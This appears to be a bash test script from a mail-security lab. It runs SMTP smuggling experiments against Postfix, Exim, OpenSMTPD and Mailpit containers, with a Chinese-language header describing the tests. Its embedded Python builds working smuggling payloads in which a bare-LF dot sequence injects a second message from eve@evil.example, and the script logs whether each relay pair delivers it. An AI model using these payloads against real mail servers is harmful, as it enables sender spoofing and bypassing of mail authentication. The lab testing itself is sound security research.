#!/bin/bash
set -u
cd /mnt/e/MailSecLab/received-lab
OUT=results/i-series
mkdir -p $OUT
MC="docker exec mail-client python3"
REC=$OUT/RECORD.md
log() { echo "[$(date +%H:%M:%S)] $*" | tee -a $REC; }

cat > $REC <<'HDR'
# I 系列实验记录（2026-09-06）

**I1 · SMTP 走私（RFC 5321 §4.1.1.4 / CVE-2023-51764 家族）**：BDAT(CHUNKING) 接收
不解释点字节；若 MTA1 中继时只对 CRLF.CRLF 做 dot-stuffing、payload 中的裸 `LF.LF`
未处理，而 MTA2 对裸点宽容，则攻击者可在一条 BDAT 报文里注入第二条 SMTP 报文。
**I2 · Received 链自洽伪造**：攻击者知道自己的 EHLO 名与 IP，可构造与真实中继头
完全衔接的伪造链 —— 测试 rspamd 链一致性校验是否拦截（承接 H3）。

HDR
log "== PRE-UP =="
docker compose --profile frspamd up -d 2>&1 | tail -1
sleep 3

log "== I0: EHLO probe =="
for m in postfix1 exim opensmtpd postfix1n mailpit; do
    echo "-- $m" | tee -a $REC
    docker exec mail-client python3 /scripts/probe_ehlo.py $m 25 2>&1 | grep -iE 'CHUNKING|PIPELINING' | tee -a $REC
done

log "== payload build =="
mkpayload() { # name sep_byte_repr
    python3 - "$1" "$2" > $OUT/$1.payload <<'PYPAY'
import sys
name, sep = sys.argv[1], {"crlf": b"\r\n.\r\n", "lf": b"\n.\n"}[sys.argv[2]]
first = (b"X-Case-ID: I1-first-" + name.encode() + b"\r\n"
         b"From: alice@sender.lab.test\r\nTo: bob@receiver.lab.test\r\n"
         b"Subject: I1 first " + name.encode() + b"\r\n\r\nbody of first message\r\n")
smug = (b"MAIL FROM:<eve@evil.example>\r\n"
        b"RCPT TO:<bob@receiver.lab.test>\r\n"
        b"DATA\r\n"
        b"X-Case-ID: I1-smug-" + name.encode() + b"\r\n"
        b"From: eve@evil.example\r\nTo: bob@receiver.lab.test\r\n"
        b"Subject: I1 SMUGGLED " + name.encode() + b"\r\n\r\nbody of smuggled message\r\n.\r\nQUIT\r\n")
sys.stdout.buffer.write(first + sep + smug)
PYPAY
    wc -c < $OUT/$1.payload | tee -a $REC
}
mkpayload crlf crlf
mkpayload lf lf

count_msgs() { # case -> first/smug counts
    c=$1
    f=$($MC /scripts/check_delivery.py --case-id "$c" --timeout 8 2>/dev/null | grep -c "DELIVERED: yes")
    s=$($MC /scripts/check_delivery.py --case-id "SMUG-$c" --timeout 8 2>/dev/null | grep -c "DELIVERED: yes")
    echo "$f/$s"
}

log "== I1 matrix: MTA1(BDAT) x MTA2 x separator =="
echo "mta1,mta2,sep,bdat_reply,first_delivered,smuggled_delivered" > $OUT/i1_matrix.csv
retarget_mta2() { # mta1 mta2
    case $1 in
      exim) docker exec exim sh -c "sed -i 's|route_list = \* [a-z0-9]* byname|route_list = * $2 byname|; s|port = [0-9]*|port = 25|' /etc/exim/exim.conf"; docker restart exim >/dev/null;;
      opensmtpd) docker exec opensmtpd sh -c "sed -i 's|smtp://[a-z0-9]*:[0-9]*|smtp://$2:25|' /etc/smtpd.conf /etc/mail/smtpd.conf"; docker restart opensmtpd >/dev/null;;
    esac
}
for pair in "exim postfix2" "exim opensmtpd" "exim mailpit" "opensmtpd postfix2" "opensmtpd exim" "opensmtpd mailpit"; do
    set -- $pair; m1=$1; m2=$2
    # normalize mta2 to mailpit sink
    case $m2 in
      postfix2) docker exec postfix2 postconf -e 'relayhost = [mailpit]:1025'; docker exec postfix2 postfix reload >/dev/null; port=25;;
      mailpit) port=1025;;
      *) port=25;;
    esac
    retarget_mta2 $m1 $m2
    sleep 3
    for sep in crlf lf; do
        c="I1-${m1}-to-${m2}-${sep}"
        r=$($MC /scripts/send_bdat.py $m1 25 $OUT/$sep.payload 2>&1 | grep -E 'CHUNKING|BDAT_REPLY' | tr '\n' ' ')
        sleep 3
        cnt=$(count_msgs $c)
        echo "$m1,$m2,$sep,$r,$cnt" >> $OUT/i1_matrix.csv
        echo "  $c -> $r first/smug=$cnt" | tee -a $REC
    done
done
# restore mta relays to mailpit
docker exec exim sh -c "sed -i 's|route_list = \* [a-z0-9]* byname|route_list = * mailpit byname|; s|port = [0-9]*|port = 1025|' /etc/exim/exim.conf"; docker restart exim >/dev/null
docker exec opensmtpd sh -c "sed -i 's|smtp://[a-z0-9]*:[0-9]*|smtp://mailpit:1025|' /etc/smtpd.conf /etc/mail/smtpd.conf"; docker restart opensmtpd >/dev/null
docker exec postfix2 postconf -e 'relayhost = [postfix3]:25'; docker exec postfix2 postfix reload >/dev/null

log "== I1b: direct receiver leniency (client DATA with bare LF dot) =="
python3 - > $OUT/i1b_lf.payload <<'PYPAY'
import sys
sys.stdout.buffer.write(b"X-Case-ID: I1B-direct\r\nFrom: alice@sender.lab.test\r\nTo: bob@receiver.lab.test\r\nSubject: I1b first\r\n\r\nbodyA\n.\nMAIL FROM:<eve@evil.example>\nRCPT TO:<bob@receiver.lab.test>\nDATA\nX-Case-ID: SMUG-I1B\r\nFrom: eve@evil.example\nSubject: I1b SMUGGLED\n\nsmuggled\n.\n")
PYPAY
for m in postfix1 exim opensmtpd mailpit postfix1n; do
    port=25; [ $m = mailpit ] && port=1025
    r=$($MC /scripts/send_raw_data.py $m $port $OUT/i1b_lf.payload 2>&1 | grep -E '^<' | tr '\n' ' ')
    sleep 2
    cnt=$(count_msgs I1B-direct)
    echo "direct,$m,lf,$r,$cnt" >> $OUT/i1_matrix.csv
    echo "  I1b $m -> first/smug=$cnt" | tee -a $REC
done
log "== I1 DONE =="
